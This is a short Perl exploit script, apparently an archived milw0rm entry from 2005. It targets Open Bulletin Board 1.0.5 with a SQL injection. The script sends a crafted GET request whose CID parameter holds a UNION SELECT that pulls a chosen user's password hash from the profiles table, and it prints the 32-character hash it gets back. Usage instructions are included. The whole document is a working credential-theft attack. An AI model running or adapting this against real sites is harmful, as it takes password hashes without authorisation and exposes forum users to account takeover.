#!/usr/bin/perl -w 
  
 # OpenBB sql injection 
 # tested on Open Bulletin Board 1.0.5 with mysql 
 # (c)oded by x97Rang 2005 RST/GHC 
 # Gr33tz:  __blf, 1dt.w0lf 
  
 use IO::Socket; 
  
 if (@ARGV != 3) 
 { 
    print "\nUsage: $0 [server] [path] [id]\n"; 
    print "like $0 forum.mysite.com / 1\n"; 
    print "If found nothing - forum NOT vulnerable\n\n"; 
    exit (); 
 } 
  
 $server = $ARGV[0]; 
 $path = $ARGV[1]; 
 $id = $ARGV[2]; 
  
 $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server",  PeerPort => "80"); 
 printf $socket ("GET %sindex.php?CID=999+union+select+1,1,password,1,1,1,1,1,1,1,1,id,1+from+profiles+where+id=$id/* HTTP/1.0\nHost: %s\nAccept: */*\nConnection: close\n\n", 
  $path,$server,$id); 
  
 while(<$socket>) 
 { 
     if (/\>(\w{32})\</) { print "$1\n"; } 
 }

# milw0rm.com [2005-07-18]
